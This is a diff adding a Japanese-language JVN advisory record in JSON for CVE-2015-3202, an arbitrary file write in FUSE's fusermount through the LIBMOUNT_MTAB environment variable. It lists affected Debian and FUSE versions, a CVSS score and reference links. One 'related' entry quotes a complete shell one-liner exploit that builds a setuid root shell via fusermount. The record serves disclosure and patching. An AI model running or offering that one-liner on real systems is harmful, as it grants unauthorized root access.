@@ -1,0 +1,115 @@
+{
+  "vulinfoid": "JVNDB-2015-003431",
+  "vulinfodata": {
+    "title": "FUSE の fusermount における任意のファイルに書き込まれる脆弱性",
+    "vulinfodescription": {
+      "overview": "FUSE の fusermount は、root として (1) mount または (2) umount を呼び出す前に環境を適切にクリアしないため、任意のファイルに書き込まれる脆弱性が存在します。"
+    },
+    "affected": {
+      "affecteditem": [
+        {
+          "name": "Debian",
+          "productname": "Debian GNU/Linux",
+          "cpe": {
+            "text": "cpe:/o:debian:debian_linux",
+            "version": "2.2"
+          },
+          "versionnumber": [
+            "8.0"
+          ]
+        },
+        {
+          "name": "FUSE",
+          "productname": "FUSE",
+          "cpe": {
+            "text": "cpe:/a:fuse:fuse",
+            "version": "2.2"
+          },
+          "versionnumber": [
+            "2.9.3-15 未満"
+          ]
+        }
+      ]
+    },
+    "impact": {
+      "cvss": [
+        {
+          "version": "2.0",
+          "severity": {
+            "text": "Low",
+            "type": "Base"
+          },
+          "base": "3.6",
+          "vector": "AV:L/AC:L/Au:N/C:N/I:P/A:P"
+        }
+      ],
+      "impactitem": {
+        "description": "ローカルユーザにより、mount のデバッグ機能により使用される巧妙に細工された LIBMOUNT_MTAB 環境変数を介して、任意のファイルに書き込まれる可能性があります。"
+      }
+    },
+    "solution": {
+      "solutionitem": {
+        "description": "ベンダより正式な対策が公開されています。ベンダ情報を参照して適切な対策を実施してください。"
+      }
+    },
+    "related": {
+      "relateditem": [
+        {
+          "type": "vendor",
+          "name": "Debian Security Advisory",
+          "vulinfoid": "DSA-3266",
+          "url": "https://www.debian.org/security/2015/dsa-3266"
+        },
+        {
+          "type": "vendor",
+          "name": "FUSE",
+          "vulinfoid": "Top Page",
+          "url": "http://fuse.sourceforge.net/"
+        },
+        {
+          "type": "vendor",
+          "name": "GitHub Gist",
+          "vulinfoid": "taviso / CVE-2015-3202",
+          "url": "https://gist.github.com/taviso/ecb70eb12d461dd85cba"
+        },
+        {
+          "type": "advisory",
+          "name": "Common Vulnerabilities and Exposures (CVE)",
+          "vulinfoid": "CVE-2015-3202",
+          "url": "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3202"
+        },
+        {
+          "type": "advisory",
+          "name": "National Vulnerability Database (NVD)",
+          "vulinfoid": "CVE-2015-3202",
+          "url": "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-3202"
+        },
+        {
+          "type": "advisory",
+          "name": "関連文書",
+          "vulinfoid": "a=/tmp/.$$;b=chmod\\ u+sx;echo $b /bin/sh>$a;$b $a;a+=\\;$a;mkdir -p $a;LIBMOUNT_MTAB=/etc/$0.$0rc _FUSE_COMMFD=0 fusermount $a #CVE-2015-3202",
+          "url": "https://twitter.com/taviso/status/601370527437967360"
+        },
+        {
+          "type": "cwe",
+          "name": "JVNDB",
+          "vulinfoid": "CWE-264",
+          "url": "https://jvndb.jvn.jp/ja/cwe/CWE-264.html",
+          "title": "認可・権限・アクセス制御"
+        }
+      ]
+    },
+    "history": {
+      "historyitem": [
+        {
+          "historyno": "0",
+          "datetime": "2018-02-17T10:37:52+09:00",
+          "description": "[2015年07月08日]\\n  掲載"
+        }
+      ]
+    },
+    "datefirstpublished": "2015-07-08T15:02:29+09:00",
+    "datelastupdated": "2015-07-08T15:02:29+09:00",
+    "datepublic": "2015-05-21T00:00:00+09:00"
+  }
+}
